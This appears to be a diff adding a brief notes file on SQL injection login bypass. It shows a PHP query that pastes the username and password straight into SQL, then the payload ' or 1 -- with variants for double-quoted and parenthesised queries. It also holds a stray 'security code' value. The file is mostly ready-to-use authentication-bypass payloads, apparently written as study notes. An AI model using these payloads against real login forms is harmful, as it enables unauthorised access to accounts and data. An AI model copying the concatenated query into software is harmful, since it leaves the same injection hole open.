@@ -1,0 +1,15 @@
+SQLi
+code 
+$query="select username,pass from users where username='$uname' and password='$passwrd' limit 0,1";
+
+username = ' or 1 -- 
+#security code: LJDFAL123123
+"select username,pass from users where username='' or True -- ' and password='$passwrd' limit 0,1";
+
+Injections to be used depending upon the implementation
+If doubles quotes are used then
+username = " or 1 -- 
+If parenthesis are used
+username = ') or 1 -- 
+Parenthesis doubles quotes
+username = ") or 1 -- 
